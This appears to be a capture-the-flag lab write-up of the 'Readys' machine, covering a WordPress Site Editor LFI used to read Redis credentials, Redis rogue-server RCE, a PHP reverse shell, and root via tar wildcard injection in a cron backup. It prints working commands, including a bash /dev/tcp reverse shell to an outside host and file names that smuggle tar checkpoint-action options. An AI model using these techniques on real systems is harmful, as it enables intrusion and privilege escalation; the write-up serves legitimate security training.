# Readys

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.208.166                   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-21 15:23 +08
Nmap scan report for 192.168.208.166
Host is up (0.17s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6379/tcp open  redis
```

Redis is enabled on this, which is probably vulnerable somehow. I did a detailed scan too:

```
$ nmap -p 80,6379 -sC -sV --min-rate 3000 192.168.208.166        
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-21 15:24 +08
Nmap scan report for 192.168.208.166
Host is up (0.18s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Readys &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.38 (Debian)
|_http-generator: WordPress 5.7.2
6379/tcp open  redis   Redis key-value store
```

Wordpress was running on the site, so let's scan that first.

### Redis Creds Block

The Redis instance needed credentials to enumerate:

```
$ redis-cli -h 192.168.208.166
192.168.208.166:6379> INFO
NOAUTH Authentication required.
```

### Wordpress LFI --> Redis Creds

I used `wpscan` on the website and found a vulnerable plugin.&#x20;

```
$ wpscan --api-token mytoken --enumerate p,t,u --url http://192.168.208.166
<TRUNCATED>
[+] site-editor
 | Location: http://192.168.208.166/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Site Editor <= 1.1.1 - Local File Inclusion (LFI)
 |     References:
 |      - https://wpscan.com/vulnerability/4432ecea-2b01-4d5c-9557-352042a57e44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7422
 |      - https://seclists.org/fulldisclosure/2018/Mar/40
 |      - https://github.com/SiteEditor/editor/issues/2
```

I confirmed that this works:

<figure><img src="../../../.gitbook/assets/image (1384).png" alt=""><figcaption></figcaption></figure>

So we have an LFI, and the only other exploitable thing is the Redis instance. I tried to find credentials for it using this LFI, and found it within `/etc/redis/redis.conf`:

{% code overflow="wrap" %}
```
$ curl http://192.168.208.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/redis/redis.conf > redis.conf
```
{% endcode %}

Searching for the `AUTH` string allowed me to find the password:

<figure><img src="../../../.gitbook/assets/image (269).png" alt=""><figcaption></figcaption></figure>

We can then enumerate the database:

<figure><img src="../../../.gitbook/assets/image (1376).png" alt=""><figcaption></figcaption></figure>

### Redis RCE

The Redis instance is vulnerable to RCE through the module loading exploit with Redis Rogue Server:

{% embed url="https://github.com/n0b0dyCN/redis-rogue-server" %}

<figure><img src="../../../.gitbook/assets/image (2154).png" alt=""><figcaption></figcaption></figure>

We can easily get a reverse shell using this RCE exploit:

<figure><img src="../../../.gitbook/assets/image (1380).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Redis --> Alice

This user had extremely limited privileges over the file system. There was a user present, but I cold not even read the `/home` directory. There wasn't much else we could do besides try to execute PHP reverse shells using the LFI we had.

I wrote a PHP reverse shell to the `/opt/redis-cli` directory. Then, using our LFI, we can execute it:

{% code overflow="wrap" %}
```
$ curl http://192.168.208.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/opt/redis-files/phpreverseshell.php
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (1436).png" alt=""><figcaption></figcaption></figure>

### Cronjob --> Tar Command Injection

I ran `pspy64` on the machine to see what processes were being run.

```
2023/07/21 03:51:01 CMD: UID=0    PID=839    | /usr/sbin/CRON -f 
2023/07/21 03:51:01 CMD: UID=0    PID=840    | /bin/sh -c /usr/local/bin/backup.sh
```

`root` is running a script here:

```bash
alice@readys:~$ cat /usr/local/bin/backup.sh
#!/bin/bash

cd /var/www/html
if [ $(find . -type f -mmin -3 | wc -l) -gt 0 ]; then
tar -cf /opt/backups/website.tar *
fi
```

This script checks multiple files at one go (3 in this case) Based on GTFOBins, we can use `tar` to execute commands.

{% embed url="https://gtfobins.github.io/gtfobins/tar/" %}

```bash
./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

To exploit this, we just need to create two files, one called `--checkpoint=1` and another called `--checkpoint-action=exec=bash ez.sh`.&#x20;

We can first create `ez.sh`:

```bash
echo '#!/bin/bash' > ez.sh
echo 'bash -i >& /dev/tcp/192.168.45.153/21 0>&1' >> ez.sh
chmod 777 ez.sh
```

Then, we can create the two files needed.

```bash
touch ./'--checkpoint=1'
touch ./'--checkpoint-action=exec=bash ez.sh'
```

After a while, the `root` user would execute the script and we would get a reverse shell:

![](<../../../.gitbook/assets/image (1422).png>)
